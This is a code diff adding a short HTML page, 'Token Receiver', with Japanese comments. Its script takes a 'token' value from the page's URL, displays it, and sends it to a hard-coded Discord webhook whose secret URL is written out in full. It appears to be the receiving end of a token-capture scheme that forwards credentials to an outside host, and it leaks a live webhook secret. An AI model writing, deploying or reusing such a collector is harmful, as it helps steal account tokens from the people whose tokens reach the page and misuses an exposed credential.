@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Token Receiver</title>
+</head>
+<body>
+  <h1>Token Received!</h1>
+  <p id="tokenDisplay"></p>
+
+  <script>
+    function sendWebhook(token) {
+      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1376371981582340106/hWmxpYudjYJISHjWzAOM5tUY2xEEX1rSSdbJSCEAGyLYsKCvv1vmpfd3GVMuL0vOdCoE'; // Webhook URL
+      fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ content: `Token: ${token}` }),
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('Webhook sent successfully!');
+        } else {
+          console.error('Failed to send webhook:', response.status, response.statusText);
+        }
+      })
+      .catch(error => {
+        console.error('Error sending webhook:', error);
+      });
+    }
+
+    // URLパラメータからトークンを取得
+    const urlParams = new URLSearchParams(window.location.search);
+    const token = urlParams.get('token');
+
+    if (token) {
+      // ウェブページにトークンを表示 (デバッグ用)
+      document.getElementById('tokenDisplay').innerText = `Token: ${token}`;
+
+      // Webhookを送信
+      sendWebhook(token);
+    } else {
+      console.log('Token not found in URL.');
+    }
+  </script>
+</body>
+</html>
